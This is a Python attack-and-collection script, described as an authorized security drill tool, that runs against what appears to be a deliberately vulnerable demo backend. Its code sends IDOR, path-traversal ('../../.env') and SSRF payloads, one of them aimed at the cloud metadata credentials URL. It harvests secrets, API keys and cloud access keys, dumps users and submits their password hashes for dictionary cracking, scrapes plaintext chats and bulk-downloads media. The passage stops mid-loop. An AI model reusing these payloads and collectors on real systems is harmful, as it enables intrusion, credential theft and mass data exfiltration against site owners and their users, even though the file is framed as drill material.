#!/usr/bin/env python3
"""
Authorized Web Resource Probe & Structured Collector

Only for authorized security drills and compliance auditing.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import json
import re
import socket
import sys
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import requests


DEFAULT_ENDPOINTS = [
    ("GET", "/admin/security/settings", "security_settings"),
    ("POST", "/admin/security/switches", "security_switches"),
    ("GET", "/leak/users", "leak_users"),
    ("POST", "/leak/crack", "leak_crack"),
    ("GET", "/leak/crawler-info", "leak_crawler_info"),
    ("GET", "/leak/chat-plaintext", "leak_chat_plaintext"),
    ("GET", "/leak/config-secrets", "leak_config_secrets"),
    ("GET", "/leak/idor-profile", "leak_idor_profile"),
    ("GET", "/leak/ssrf", "leak_ssrf"),
    ("GET", "/leak/file-read", "leak_file_read"),
]


@dataclass
class CollectorConfig:
    base_url: str
    output_dir: Path
    timeout: int
    delay_ms: int
    max_pages: int
    max_items_per_type: int
    mode: str
    probe_ws_url: Optional[str]
    include_crack_demo: bool
    asset_origin: str
    enable_attack_probes: bool
    show_asset_inventory: bool
    verbose_download_logs: bool
    print_summary_json: bool
    download_policy: str
    download_types: List[str]
    download_counts: Dict[str, int]
    download_item_indexes: Dict[str, List[int]]


class StructuredCollector:
    def __init__(self, cfg: CollectorConfig) -> None:
        self.cfg = cfg
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "authorized-security-tester/1.0",
                "Accept": "application/json",
            }
        )
        self.logs: List[Dict[str, Any]] = []
        self.step_no = 0
        self.latest_assets: Dict[str, List[Dict[str, Any]]] = {"video": [], "image": [], "article": []}
        self.request_traces: List[Dict[str, Any]] = []

    def run(self) -> Dict[str, Any]:
        self._prepare_dirs()
        self._log(
            "info",
            "启动采集任务",
            {
                "api_base_url": self.cfg.base_url,
                "asset_origin_effective": self._asset_origin(),
                "note": "5173通常是前端端口，3000通常是后端API端口；可用 --asset-origin 覆盖资源下载出口",
            },
        )

        probe_result = self.probe_interfaces()
        switch_state = self.inspect_switch_state()
        attack_probe_result = self.run_attack_probes() if self.cfg.enable_attack_probes else {"enabled": False}
        demo_leak_result = self.run_demo_leak_probes()
        collected: Dict[str, Any] = {}

        if self.cfg.mode in ("auto", "hybrid"):
            collected = self.progressive_collect()
        elif self.cfg.mode == "manual":
            self._log("info", "manual 模式：仅执行接口探测，不自动采集")

        download_result = self.download_assets_workflow()
        defense_assessment = self.assess_defense(collected, attack_probe_result)
        integrity = self.verify_integrity()
        summary = {
            "started_at": datetime.now().isoformat(),
            "mode": self.cfg.mode,
            "base_url": self.cfg.base_url,
            "probe_result": probe_result,
            "switch_state": switch_state,
            "attack_probe_result": attack_probe_result,
            "demo_leak_result": demo_leak_result,
            "collected": collected,
            "download_result": download_result,
            "defense_assessment": defense_assessment,
            "integrity": integrity,
        }
        self._write_json(self.cfg.output_dir / "reports" / "auto_run_summary.json", summary)
        self._write_json(self.cfg.output_dir / "reports" / "request_traces.json", self.request_traces)
        self._write_logs()
        return summary

    def run_demo_leak_probes(self) -> Dict[str, Any]:
        """
        演示型“重要数据外带”链路：用于把不同攻击类型的“成功/拦截”结果直接展示在终端日志。
        注意：这是授权演练用的模拟数据，不代表真实系统漏洞。
        """
        self._log("info", "开始演示外带探测（IDOR/SSRF/遍历/配置泄露）")
        probes: List[Dict[str, Any]] = [
            {"type": "config_leak", "method": "GET", "path": "/leak/config-secrets", "params": {}},
            {"type": "idor", "method": "GET", "path": "/leak/idor-profile", "params": {"userId": 1}},
            {"type": "ssrf", "method": "GET", "path": "/leak/ssrf", "params": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}},
            {"type": "path_traversal", "method": "GET", "path": "/leak/file-read", "params": {"path": "../../.env"}},
        ]

        def classify(status: int, body: Any) -> str:
            if status == 403:
                return "blocked"
            if status == 401:
                return "auth_required"
            if status == 404:
                return "not_found"
            if status >= 500:
                return "server_error"
            return "leaked"

        def extract_important(p_type: str, body: Any) -> Dict[str, Any]:
            if not isinstance(body, dict):
                return {}
            if p_type == "config_leak":
                sec = body.get("secrets") if isinstance(body.get("secrets"), dict) else {}
                return {k: sec.get(k) for k in ["dbPassword", "apiKey", "internalToken", "jwtSecretHint"] if k in sec}
            if p_type == "idor":
                user = body.get("user") if isinstance(body.get("user"), dict) else {}
                sim = body.get("simulatedSensitive") if isinstance(body.get("simulatedSensitive"), dict) else {}
                return {k: user.get(k) for k in ["id", "email", "username", "role"] if k in user} | {"resetToken": sim.get("resetToken")}
            if p_type == "ssrf":
                internal = body.get("internal") if isinstance(body.get("internal"), dict) else {}
                return {k: internal.get(k) for k in ["instanceId", "iamRole", "accessKeyId", "secretAccessKey", "token"] if k in internal}
            if p_type == "path_traversal":
                return {"file": body.get("file"), "content_head": str(body.get("content", ""))[:80]}
            return {}

        rows: List[Dict[str, Any]] = []
        for p in probes:
            try:
                status, body = self._request_with_params(p["method"], p["path"], p["params"])
                verdict = classify(status, body)
                important = extract_important(p["type"], body)
                rows.append({"type": p["type"], "path": p["path"], "params": p["params"], "status": status, "verdict": verdict, "important": important})
                if verdict == "leaked":
                    self._log("warn", f"外带成功 {p['type']} {p['path']} (HTTP {status})", {"type": p["type"], "important": important})
                else:
                    self._log("info", f"外带拦截/无结果 {p['type']} {p['path']} -> {verdict} (HTTP {status})", {"type": p["type"], "hint": self._body_hint(body)})
            except Exception as exc:
                rows.append({"type": p["type"], "path": p["path"], "params": p["params"], "status": 0, "verdict": "exception", "important": {}, "error": str(exc)})
                self._log("warn", f"外带探测异常 {p['type']} {p['path']}", {"type": p["type"], "error": str(exc)})
            self._delay()

        self._write_json(self.cfg.output_dir / "reports" / "demo_leak_results.json", rows)
        return {"enabled": True, "total": len(rows), "items": rows}

    def inspect_switch_state(self) -> Dict[str, Any]:
        status, body = self._request("GET", "/admin/security/settings")
        result: Dict[str, Any] = {"status": status}
        if status >= 400:
            result["message"] = str(body.get("message", "")) if isinstance(body, dict) else "request_failed"
            self._log(
                "warn",
                "无法读取四开关状态（通常是未携带管理员token）",
                {"status": status, "message": result["message"]},
            )
            return result
        result.update(
            {
                "defenseEnabled": bool(body.get("defenseEnabled", body.get("wafBlockEnabled", False))),
                "userProtectionEnabled": bool(body.get("userProtectionEnabled", False)),
                "antiCrawlerEnabled": bool(body.get("antiCrawlerEnabled", False)),
                "chatEncryptionEnabled": bool(body.get("chatEncryptionEnabled", False)),
            }
        )
        self._log("info", "四开关状态", result)
        return result

    def assess_defense(self, collected: Dict[str, Any], attack_probe_result: Dict[str, Any]) -> Dict[str, Any]:
        users_status = int((collected.get("users") or {}).get("status") or 0)
        crawler_status = int((collected.get("crawler") or {}).get("status") or 0)
        chat = collected.get("chat") or {}
        chat_status = int(chat.get("status") or 0)
        chat_encryption = bool(chat.get("encryptionEnabled"))
        blocked_count = sum(1 for s in [users_status, crawler_status] if s == 403)

        if blocked_count >= 2 and chat_status == 200 and chat_encryption:
            phase = "defense_on_effective"
            message = "防御开关效果明显：用户与资源外带被拦截，对话仅密文/不可明文泄露。"
        elif users_status == 200 or crawler_status == 200:
            phase = "defense_off_or_weak"
            message = "检测到外带成功：已可获取敏感资产，说明当前更接近防御关闭或策略较弱。"
        else:
            phase = "mixed_or_unknown"
            message = "防御状态混合：部分接口可访问，建议结合开关状态与攻击日志复核。"

        probe_enabled = bool(attack_probe_result.get("enabled"))
        recommendation = (
            "建议双阶段验证：先开防御验证“应拦截”，再关防御验证“可泄露”，两次报告一起留档。"
            if probe_enabled
            else "建议开启攻击探测并做双阶段验证（防御开/关各跑一次）。"
        )
        result = {
            "phase": phase,
            "users_status": users_status,
            "crawler_status": crawler_status,
            "chat_status": chat_status,
            "chat_encryption": chat_encryption,
            "message": message,
            "recommendation": recommendation,
        }
        self._log("info", "防御评估结论", {"phase": phase, "message": message})
        self._log("info", "运行建议", {"recommendation": recommendation})
        return result

    def _prepare_dirs(self) -> None:
        for p in [
            self.cfg.output_dir / "reports",
            self.cfg.output_dir / "reports" / "apis",
            self.cfg.output_dir / "reports" / "logs",
            self.cfg.output_dir / "collected" / "users",
            self.cfg.output_dir / "collected" / "media",
            self.cfg.output_dir / "collected" / "text",
            self.cfg.output_dir / "collected" / "chat",
            self.cfg.output_dir / "downloads" / "video",
            self.cfg.output_dir / "downloads" / "image",
            self.cfg.output_dir / "downloads" / "article",
            self.cfg.output_dir / "downloads" / "chat",
            self.cfg.output_dir / "integrity",
        ]:
            p.mkdir(parents=True, exist_ok=True)

    def _request(self, method: str, path: str, json_body: Optional[Dict[str, Any]] = None) -> Tuple[int, Any]:
        url = self._request_url(path)
        resp = self.session.request(method=method, url=url, json=json_body, timeout=self.cfg.timeout)
        try:
            body = resp.json()
        except Exception:
            body = {"raw": resp.text[:2000]}
        self.request_traces.append(
            {
                "method": method,
                "path": path,
                "url": url,
                "json_body": json_body if json_body is not None else "(none)",
                "status": resp.status_code,
                "response": body,
            }
        )
        return resp.status_code, body

    def _request_with_params(self, method: str, path: str, params: Optional[Dict[str, Any]] = None) -> Tuple[int, Any]:
        url = self._request_url(path)
        resp = self.session.request(method=method, url=url, params=params, timeout=self.cfg.timeout)
        try:
            body = resp.json()
        except Exception:
            body = {"raw": resp.text[:2000]}
        self.request_traces.append(
            {
                "method": method,
                "path": path,
                "url": url,
                "params": params if params is not None else {},
                "status": resp.status_code,
                "response": body,
            }
        )
        return resp.status_code, body

    def _request_url(self, path: str) -> str:
        return urljoin(self.cfg.base_url.rstrip("/") + "/", path.lstrip("/"))

    @staticmethod
    def _short_body(body: Any) -> str:
        try:
            text = json.dumps(body, ensure_ascii=False)
        except Exception:
            text = str(body)
        return text[:100]

    @staticmethod
    def _body_hint(body: Any) -> str:
        if isinstance(body, dict):
            if "message" in body:
                return str(body.get("message"))
            if "error" in body:
                return str(body.get("error"))
            keys = list(body.keys())[:4]
            return f"keys={keys}"
        return str(body)[:80]

    def _delay(self) -> None:
        if self.cfg.delay_ms > 0:
            time.sleep(self.cfg.delay_ms / 1000.0)

    def _log(self, level: str, message: str, detail: Optional[Dict[str, Any]] = None) -> None:
        self.step_no += 1
        row = {
            "ts": datetime.now().isoformat(timespec="seconds"),
            "step": self.step_no,
            "level": level,
            "message": message,
            "detail": detail or {},
        }
        self.logs.append(row)
        detail_txt = ""
        if row["detail"]:
            try:
                detail_txt = " | " + json.dumps(row["detail"], ensure_ascii=False)
            except Exception:
                detail_txt = f" | {row['detail']}"
        print(f"[{row['ts']}] [{level.upper()}] {message}{detail_txt}")

    def _write_logs(self) -> None:
        jsonl_path = self.cfg.output_dir / "reports" / "logs" / "scan_steps.jsonl"
        log_path = self.cfg.output_dir / "reports" / "logs" / "scan_steps.log"
        with jsonl_path.open("w", encoding="utf-8") as f:
            for row in self.logs:
                f.write(json.dumps(row, ensure_ascii=False) + "\n")
        with log_path.open("w", encoding="utf-8") as f:
            for row in self.logs:
                f.write(f"{row['ts']} [{row['level']}] {row['message']}\n")

    @staticmethod
    def _write_json(path: Path, data: Any) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

    def probe_interfaces(self) -> Dict[str, Any]:
        self._log("info", "开始接口探测（HTTP/HTTPS）")
        rows: List[Dict[str, Any]] = []

        for method, path, alias in DEFAULT_ENDPOINTS:
            try:
                if method == "POST":
                    status, body = self._request(method, path, {})
                else:
                    status, body = self._request(method, path)
                row = {
                    "method": method,
                    "path": path,
                    "alias": alias,
                    "status": status,
                    "reachable": status < 500,
                    "message": body.get("message", "") if isinstance(body, dict) else "",
                }
                rows.append(row)
                self._log(
                    "info",
                    f"探测 {method} {path} -> HTTP {status}",
                    {
                        "method": method,
                        "path": path,
                        "status": status,
                        "hint": self._body_hint(body),
                    },
                )
            except Exception as exc:
                rows.append(
                    {
                        "method": method,
                        "path": path,
                        "alias": alias,
                        "status": 0,
                        "reachable": False,
                        "message": str(exc),
                    }
                )
                self._log("warn", f"探测失败 {method} {path}", {"error": str(exc)})
            self._delay()

        ws_result = self._probe_ws()
        result = {"http_endpoints": rows, "websocket_probe": ws_result}

        self._write_json(self.cfg.output_dir / "reports" / "discovered_endpoints.json", result)
        self._write_csv(self.cfg.output_dir / "reports" / "apis" / "http_endpoints.csv", rows)
        self._write_json(self.cfg.output_dir / "reports" / "apis" / "http_endpoints.json", rows)
        return result

    def _probe_ws(self) -> Dict[str, Any]:
        if not self.cfg.probe_ws_url:
            return {"enabled": False, "reason": "no ws url configured"}
        parsed = urlparse(self.cfg.probe_ws_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "wss" else 80)
        if not host:
            return {"enabled": True, "ok": False, "error": "invalid ws url"}
        try:
            with socket.create_connection((host, port), timeout=self.cfg.timeout):
                self._log("info", f"WebSocket 端口探测成功 {host}:{port}")
                return {"enabled": True, "ok": True, "host": host, "port": port}
        except Exception as exc:
            self._log("warn", f"WebSocket 端口探测失败 {host}:{port}", {"error": str(exc)})
            return {"enabled": True, "ok": False, "host": host, "port": port, "error": str(exc)}

    @staticmethod
    def _write_csv(path: Path, rows: List[Dict[str, Any]]) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        if not rows:
            path.write_text("", encoding="utf-8")
            return
        keys = list(rows[0].keys())
        with path.open("w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            writer.writerows(rows)

    def progressive_collect(self) -> Dict[str, Any]:
        self._log("info", "开始渐进式采集（Step#1 -> Step#2 -> Step#3）")

        result = {
            "users": self._collect_users(),
            "crawler": self._collect_crawler_data(),
            "chat": self._collect_chat_data(),
        }
        return result

    def _collect_users(self) -> Dict[str, Any]:
        self._log("info", "Step#1: GET /leak/users")
        status, body = self._request("GET", "/leak/users")
        out = {"status": status, "count": 0}
        self._log(
            "info" if status < 400 else "warn",
            "请求结果 GET /leak/users",
            {
                "method": "GET",
                "path": "/leak/users",
                "status": status,
                "hint": self._body_hint(body),
            },
        )
        if status >= 400:
            out["message"] = body.get("message", "blocked") if isinstance(body, dict) else "blocked"
            self._log("warn", "用户数据采集被阻断", out)
            return out

        items = (body.get("items") or []) if isinstance(body, dict) else []
        deduped = self._dedupe_by_key(items, key="id")
        limited = deduped[: self.cfg.max_items_per_type]
        out["count"] = len(limited)

        self._write_json(self.cfg.output_dir / "collected" / "users" / "users.json", limited)
        self._log("info", f"用户数据采集完成，共 {len(limited)} 条")

        if self.cfg.include_crack_demo and limited:
            targets = [
                {
                    "email": it.get("email") or it.get("username") or f"user-{idx + 1}",
                    "hash": it.get("password_hash", ""),
                }
                for idx, it in enumerate(limited)
                if it.get("password_hash")
            ]
            if targets:
                crack_payload = {
                    "mode": "dictionary",
                    "targets": targets[:20],
                }
                s2, b2 = self._request("POST", "/leak/crack", crack_payload)
                self._log(
                    "info" if s2 < 400 else "warn",
                    "请求结果 POST /leak/crack",
                    {
                        "method": "POST",
                        "path": "/leak/crack",
                        "payload": {"mode": crack_payload["mode"], "targets_count": len(crack_payload["targets"])},
                        "status": s2,
                        "hint": self._body_hint(b2),
                    },
                )
                out["crack_status"] = s2
                if s2 < 400 and isinstance(b2, dict):
                    self._write_json(self.cfg.output_dir / "collected" / "users" / "crack_result.json", b2)
                    out["crack_success"] = b2.get("successCount", 0)
                    self._log("info", "破解演示结果已归档")
                else:
                    out["crack_message"] = b2.get("message", "failed") if isinstance(b2, dict) else "failed"
                    self._log("warn", "破解演示调用失败", {"status": s2})
        self._delay()
        return out

    def _collect_crawler_data(self) -> Dict[str, Any]:
        self._log("info", "Step#2: GET /leak/crawler-info")
        status, body = self._request("GET", "/leak/crawler-info")
        out: Dict[str, Any] = {"status": status, "video": 0, "image": 0, "article": 0}
        self._log(
            "info" if status < 400 else "warn",
            "请求结果 GET /leak/crawler-info",
            {
                "method": "GET",
                "path": "/leak/crawler-info",
                "status": status,
                "hint": self._body_hint(body),
            },
        )
        if status >= 400:
            out["message"] = body.get("message", "blocked") if isinstance(body, dict) else "blocked"
            self._log("warn", "媒体/文本采集被阻断", out)
            return out

        groups = body.get("groups", {}) if isinstance(body, dict) else {}
        videos = self._dedupe_by_key(groups.get("video", []), "id")[: self.cfg.max_items_per_type]
        images = self._dedupe_by_key(groups.get("image", []), "id")[: self.cfg.max_items_per_type]
        articles = self._dedupe_by_key(groups.get("article", []), "id")[: self.cfg.max_items_per_type]
        out.update({"video": len(videos), "image": len(images), "article": len(articles)})

        video_assets = [self._normalize_video_asset(x) for x in videos]
        image_assets = [self._normalize_image_asset(x) for x in images]
        article_assets = [self._normalize_article_asset(x) for x in articles]
        self.latest_assets = {"video": video_assets, "image": image_assets, "article": article_assets}

        self._write_json(self.cfg.output_dir / "collected" / "media" / "videos.json", videos)
        self._write_json(self.cfg.output_dir / "collected" / "media" / "images.json", images)
        self._write_json(self.cfg.output_dir / "collected" / "text" / "articles.json", articles)
        self._write_json(
            self.cfg.output_dir / "reports" / "asset_inventory.json",
            {
                "video": video_assets,
                "image": image_assets,
                "article": article_assets,
            },
        )

        self._log("info", f"媒体采集完成: 视频 {len(videos)} / 插画 {len(images)} / 专栏 {len(articles)}")
        if self.cfg.show_asset_inventory:
            self._print_asset_inventory()
        self._delay()
        return out

    def _collect_chat_data(self) -> Dict[str, Any]:
        self._log("info", "Step#3: GET /leak/chat-plaintext")
        status, body = self._request("GET", "/leak/chat-plaintext")
        out = {"status": status, "count": 0, "encryptionEnabled": None}
        self._log(
            "info" if status < 400 else "warn",
            "请求结果 GET /leak/chat-plaintext",
            {
                "method": "GET",
                "path": "/leak/chat-plaintext",
                "status": status,
                "hint": self._body_hint(body),
            },
        )
        if status >= 400:
            out["message"] = body.get("message", "blocked") if isinstance(body, dict) else "blocked"
            self._log("warn", "对话采集被阻断", out)
            return out

        out["encryptionEnabled"] = body.get("encryptionEnabled") if isinstance(body, dict) else None
        items = self._dedupe_by_key((body.get("items") or []) if isinstance(body, dict) else [], "id")
        items = items[: self.cfg.max_items_per_type]
        out["count"] = len(items)
        self._write_json(self.cfg.output_dir / "collected" / "chat" / "chat_items.json", items)
        self._write_txt_chat(self.cfg.output_dir / "collected" / "chat" / "chat_export.txt", items)

        self._log("info", f"对话采集完成，共 {len(items)} 条")
        self._delay()
        return out

    @staticmethod
    def _dedupe_by_key(items: List[Dict[str, Any]], key: str) -> List[Dict[str, Any]]:
        seen = set()
        output = []
        for it in items:
            k = it.get(key)
            if k in seen:
                continue
            seen.add(k)
            output.append(it)
        return output

    @staticmethod
    def _write_txt_chat(path: Path, rows: List[Dict[str, Any]]) -> None:
        lines: List[str] = []
        for row in rows:
            sender = (row.get("sender") or {}).get("username", "unknown")
            ts = row.get("created_at", "")
            content = row.get("plaintext") or f"【密文】{row.get('storedContent', '')}"
            lines.append(f"[{ts}] {sender}: {content}")
        path.write_text("\n".join(lines), encoding="utf-8")

    def _origin(self) -> str:
        parsed = urlparse(self.cfg.base_url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def _asset_origin(self) -> str:
        raw = str(self.cfg.asset_origin or "").strip()
        if raw:
            p = urlparse(raw)
            if p.scheme and p.netloc:
                return f"{p.scheme}://{p.netloc}"
        return self._origin()

    def _make_abs_url(self, raw: str) -> str:
        s = str(raw or "").strip()
        if not s:
            return ""
        if s.startswith("http://") or s.startswith("https://"):
            p = urlparse(s)
            target_origin = self._asset_origin()
            if target_origin and f"{p.scheme}://{p.netloc}" != target_origin:
                # 统一资源下载出口（如从 3000 重写到 5173 或指定网关）
                return urljoin(target_origin.rstrip("/") + "/", p.path.lstrip("/"))
            return s
        return urljoin(self._asset_origin().rstrip("/") + "/", s.lstrip("/"))

    def _safe_name(self, raw: str, fallback: str) -> str:
        name = str(raw or "").strip() or fallback
        return re.sub(r"[\\/:*?\"<>|]+", "_", name)

    def _normalize_video_asset(self, x: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "id": x.get("id"),
            "title": x.get("title", ""),
            "download_url": self._make_abs_url(str(x.get("downloadUrl") or x.get("media_url") or x.get("cover_url") or "")),
            "cover_url": self._make_abs_url(str(x.get("cover_url") or "")),
        }

    def _normalize_image_asset(self, x: Dict[str, Any]) -> Dict[str, Any]:
        urls = x.get("imageUrls") or []
        if not isinstance(urls, list):
            urls = []
        normalized = [self._make_abs_url(str(u)) for u in urls if str(u).strip()]
        if not normalized:
            first = self._make_abs_url(str(x.get("downloadUrl") or x.get("media_url") or x.get("cover_url") or ""))
            if first:
                normalized = [first]
        return {
            "id": x.get("id"),
            "title": x.get("title", ""),
            "image_urls": normalized,
            "image_count": len(normalized),
        }

    def _normalize_article_asset(self, x: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "id": x.get("id"),
            "title": x.get("title", ""),
            "summary": x.get("summary", ""),
            "body": x.get("body", ""),
            "word_like_pages": x.get("wordLikePages", 0),
        }

    def _print_asset_inventory(self) -> None:
        self._log("info", "以下为可下载清单（序号用于按条目下载）")
        for kind in ("video", "image", "article"):
            rows = self.latest_assets.get(kind, [])
            print(f"\n=== {kind.upper()} 可下载条目: {len(rows)} ===")
            if not rows:
                print("  (空)")
                continue
            for idx, row in enumerate(rows, start=1):
                if kind == "video":
                    print(f"  [{idx}] id={row.get('id')} title={row.get('title')} url={row.get('download_url')}")
                elif kind == "image":
                    print(f"  [{idx}] id={row.get('id')} title={row.get('title')} images={row.get('image_count')}")
                else:
                    body_len = len(str(row.get("body") or ""))
                    print(f"  [{idx}] id={row.get('id')} title={row.get('title')} body_chars={body_len}")

    def _download_file(self, url: str, target: Path, tag: str) -> Tuple[bool, str]:
        if not url:
            return False, "empty_url"
        try:
            resp = self.session.get(url, timeout=self.cfg.timeout, stream=True)
            if resp.status_code >= 400:
                return False, f"http_{resp.status_code}"
            ctype = str(resp.headers.get("Content-Type", "")).lower()
            final_target = self._with_real_extension(target, url, ctype, tag)
            final_target.parent.mkdir(parents=True, exist_ok=True)
            with final_target.open("wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return True, f"ok:{tag}:{final_target}"
        except Exception as exc:
            return False, str(exc)

    def _with_real_extension(self, target: Path, url: str, content_type: str, tag: str) -> Path:
        ext = self._detect_extension(url, content_type, tag)
        if target.suffix.lower() == ext:
            return target
        return target.with_suffix(ext)

    @staticmethod
    def _detect_extension(url: str, content_type: str, tag: str) -> str:
        ctype = (content_type or "").split(";")[0].strip().lower()
        if ctype in {"image/jpeg", "image/jpg"}:
            return ".jpg"
        if ctype == "image/png":
            return ".png"
        if ctype == "image/webp":
            return ".webp"
        if ctype == "image/gif":
            return ".gif"
        if ctype in {"video/mp4", "application/mp4"}:
            return ".mp4"
        if ctype in {"video/webm"}:
            return ".webm"
        if ctype in {"video/quicktime"}:
            return ".mov"

        path = urlparse(url).path.lower()
        for ext in [".jpg", ".jpeg", ".png", ".webp", ".gif", ".mp4", ".webm", ".mov", ".m4v"]:
            if path.endswith(ext):
                if ext == ".jpeg":
                    return ".jpg"
                if ext == ".m4v":
                    return ".mp4"
                return ext
        return ".mp4" if tag == "video" else ".jpg"

    def _export_article_doc(self, row: Dict[str, Any]) -> Tuple[bool, str, str]:
        title = str(row.get("title") or "article")
        safe = self._safe_name(title, f"article-{row.get('id')}")
        p = self.cfg.output_dir / "downloads" / "article" / f"{safe}.doc"
        content = f"{title}\n\n{row.get('summary', '')}\n\n{row.get('body', '')}\n"
        try:
            p.write_text(content, encoding="utf-8")
            return True, str(p), "ok"
        except Exception as exc:
            return False, str(p), str(exc)

    def _export_chat_texts(self) -> Dict[str, Any]:
        src = self.cfg.output_dir / "collected" / "chat" / "chat_items.json"
        if not src.exists():
            self._log("warn", "对话导出跳过：未找到 chat_items.json（可能接口被拒绝）")
            blocked_path = self.cfg.output_dir / "downloads" / "chat" / "chat_blocked.txt"
            blocked_path.write_text("chat export blocked: chat_items.json not found\n", encoding="utf-8")
            return {"status": "blocked", "reason": "chat_items_missing", "output": str(blocked_path)}

        items = json.loads(src.read_text(encoding="utf-8"))
        plain_lines: List[str] = []
        cipher_lines: List[str] = []
        plain_count = 0
        cipher_count = 0

        for x in items:
            sender = (x.get("sender") or {}).get("username", "unknown")
            ts = x.get("created_at", "")
            plaintext = str(x.get("plaintext") or "")
            stored = str(x.get("storedContent") or "")
            if plaintext:
                plain_count += 1
                plain_lines.append(f"[{ts}] {sender}: {plaintext}")
            if stored:
                cipher_count += 1
                cipher_lines.append(f"[{ts}] {sender}: {stored}")

        chat_dir = self.cfg.output_dir / "downloads" / "chat"
        plain_path = chat_dir / "chat_plaintext.txt"
        cipher_path = chat_dir / "chat_ciphertext.txt"
        mixed_path = chat_dir / "chat_mixed.txt"

        if plain_lines:
            plain_path.write_text("\n".join(plain_lines), encoding="utf-8")
        if cipher_lines:
            cipher_path.write_text("\n".join(cipher_lines), encoding="utf-8")

        mixed_lines: List[str] = []
        for x in items:
            sender = (x.get("sender") or {}).get("username", "unknown")
            ts = x.get("created_at", "")
            plaintext = str(x.get("plaintext") or "")
            stored = str(x.get("storedContent") or "")
            content = plaintext if plaintext else f"【密文】{stored}"
            mixed_lines.append(f"[{ts}] {sender}: {content}")
        mixed_path.write_text("\n".join(mixed_lines), encoding="utf-8")

        self._log(
            "info",
            "对话 txt 已导出（明文/密文/混合）",
            {
                "plain_count": plain_count,
                "cipher_count": cipher_count,
                "plain_path": str(plain_path),
                "cipher_path": str(cipher_path),
                "mixed_path": str(mixed_path),
            },
        )
        if plain_count == 0 and cipher_count > 0:
            self._log("warn", "检测到外带对话仅为密文（无明文），可据此判断加密策略已生效")

        return {
            "status": "ok",
            "plain_count": plain_count,
            "cipher_count": cipher_count,
            "plain_path": str(plain_path),
            "cipher_path": str(cipher_path),
            "mixed_path": str(mixed_path),
        }

    def _resolve_plan(self) -> Dict[str, Any]:
        policy = self.cfg.download_policy
        if policy == "prompt":
            print("\n请选择下载策略: [all/type/item/none]")
            picked = input("download policy> ").strip().lower()
            policy = picked if picked in {"all", "type", "item", "none"} else "none"
        if policy == "none":
            return {"policy": "none"}
        if policy == "all":
            return {"policy": "all"}
        if policy == "type":
            types = self.cfg.download_types
            counts = self.cfg.download_counts
            if self.cfg.download_policy == "prompt":
                print("请输入类型(逗号分隔: video,image,article):")
                types_in = input("types> ").strip()
                types = [x.strip() for x in types_in.split(",") if x.strip() in {"video", "image", "article"}]
                counts = {}
                for t in types:
                    n = input(f"{t} 下载数量(空=全部)> ").strip()
                    if n.isdigit():
                        counts[t] = int(n)
            return {"policy": "type", "types": types, "counts": counts}
        indexes = self.cfg.download_item_indexes
        if self.cfg.download_policy == "prompt":
            indexes = {}
            for t in ("video", "image", "article"):
                val = input(f"{t} 序号(如 1,3,5；空=不下)> ").strip()
                if not val:
                    continue
                idx = []
                for x in val.split(","):
                    x = x.strip()
                    if x.isdigit():
                        idx.append(int(x))
                indexes[t] = idx
        return {"policy": "item", "indexes": indexes}

    def download_assets_workflow(self) -> Dict[str, Any]:
        assets = self.latest_assets
        if not any(assets.values()):
            self._log("warn", "未发现可下载资产，跳过下载阶段")
            return {"skipped": True, "reason": "no_assets"}
        plan = self._resolve_plan()
        if plan.get("policy") == "none":
            self._log("info", "下载策略为 none，已跳过")
            return {"skipped": True, "reason": "policy_none"}
        self._log("info", f"开始执行下载策略：{plan.get('policy')}")
        result = {"policy": plan.get("policy"), "ok": 0, "rejected": 0, "details": [], "chat_export": {}}

        def pick_items(kind: str) -> List[Tuple[int, Dict[str, Any]]]:
            rows = assets.get(kind, [])
            if plan["policy"] == "all":
                return list(enumerate(rows, start=1))
            if plan["policy"] == "type":
                if kind not in plan.get("types", []):
                    return []
                count = int(plan.get("counts", {}).get(kind, 0))
                if count > 0:
                    return list(enumerate(rows[:count], start=1))
                return list(enumerate(rows, start=1))
            idxs = set(plan.get("indexes", {}).get(kind, []))
            return [(i, row) for i, row in enumerate(rows, start=1) if i in idxs]

        for kind in ("video", "image", "article"):
            selected = pick_items(kind)
            self._log("info", f"{kind} 计划下载 {len(selected)} 条")
            for idx, row in selected:
                if kind == "video":
                    title = self._safe_name(str(row.get("title") or ""), f"video-{row.get('id')}")
                    target = self.cfg.output_dir / "downloads" / "video" / f"{title}"
                    ok, msg = self._download_file(str(row.get("download_url") or ""), target, "video")
                    detail = {
                        "kind": kind,
                        "index": idx,
                        "id": row.get("id"),
                        "title": row.get("title"),
                        "url": row.get("download_url"),
                        "target": str(target),
                        "result": msg,
                    }
                    result["details"].append(detail)
                    if ok:
                        result["ok"] += 1
                        if self.cfg.verbose_download_logs:
                            self._log("info", f"[成功] 下载视频 #{idx} {row.get('title')}", detail)
                    else:
                        result["rejected"] += 1
                        if self.cfg.verbose_download_logs:
                            self._log("warn", f"[拒绝] 下载视频 #{idx} {row.get('title')}", detail)
                elif kind == "image":
                    urls = row.get("image_urls") or []
                    if not urls:
                        result["rejected"] += 1
                        detail = {"kind": kind, "index": idx, "id": row.get("id"), "title": row.get("title"), "result": "no_image_urls"}
                        result["details"].append(detail)
                        if self.cfg.verbose_download_logs:
                            self._log("warn", f"[拒绝] 插画 #{idx} 无图片链接", detail)
                        continue
                    ok_count = 0
                    fail_count = 0
                    for i, u in enumerate(urls, start=1):
                        title = self._safe_name(str(row.get("title") or ""), f"image-{row.get('id')}")
                        target = self.cfg.output_dir / "downloads" / "image" / title / f"{i:03d}"
                        ok, msg = self._download_file(str(u), target, "image")
                        if ok:
                            ok_count += 1
                        else:
                            fail_count += 1
                        sub_detail = {
                            "kind": kind,
                            "index": idx,
                            "id": row.get("id"),
                            "title": row.get("title"),
                            "image_no": i,
                            "url": u,
                            "target": str(target),
                            "result": msg,
                        }
                        result["details"].append(sub_detail)
